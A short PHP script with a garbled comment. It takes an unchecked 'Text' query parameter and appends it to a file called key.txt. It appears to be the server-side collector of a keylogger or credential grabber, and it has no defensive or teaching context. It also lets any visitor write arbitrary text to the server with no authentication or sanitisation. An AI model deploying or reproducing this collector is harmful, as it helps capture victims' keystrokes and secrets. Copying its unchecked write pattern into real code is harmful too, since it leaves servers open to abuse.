<?php 

$Text = $_GET['Text']; // �����

$file = 'key.txt';

$current = file_get_contents($file);
$current .= "$Text\n";

file_put_contents($file, $current);

?>